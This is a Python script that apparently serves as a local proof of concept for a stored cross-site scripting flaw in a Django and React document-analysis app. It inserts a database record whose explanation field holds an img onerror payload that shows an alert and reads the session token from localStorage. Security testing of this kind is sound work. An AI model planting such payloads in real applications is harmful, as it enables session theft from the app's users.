import os
import django
import sys

# Setup Django environment
sys.path.append(os.path.join(os.getcwd(), 'backend'))
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'core.settings')
django.setup()

from documents.models import Document
from django.contrib.auth import get_user_model

User = get_user_model()

def inject_xss():
    # Find a user to attach the document to
    user = User.objects.first()
    if not user:
        print("ERROR: No users found. Please register a user first.")
        return

    # THE MALICIOUS PAYLOAD
    # This payload will execute JavaScript when rendered via dangerouslySetInnerHTML
    xss_payload = "Your contract is safe. <img src=x onerror=\"alert('XSS ATTACK SUCCESS! Document ID: ' + window.location.hash); console.log('Session Token:', localStorage.getItem('access_token'))\">"

    doc = Document.objects.create(
        user=user,
        title="Insecure Document",
        file_name="malicious_contract.pdf",
        file_path="/tmp/malicious.pdf",
        overall_risk_score=95,
        analysis_data={
            "ai_insights": {
                "plain_language_explanation": xss_payload,
                "risk_explanation_summary": "High risk detected due to malicious payload.",
                "suggested_improvements": ["Sanitize your inputs!", "Remove dangerouslySetInnerHTML"]
            }
        }
    )

    print(f"--- XSS Payload Injected ---")
    print(f"Document ID: {doc.id}")
    print(f"Payload: {xss_payload}")
    print("\nAction: Now navigate to your Summary page and click on 'Insecure Document'.")

if __name__ == "__main__":
    inject_xss()
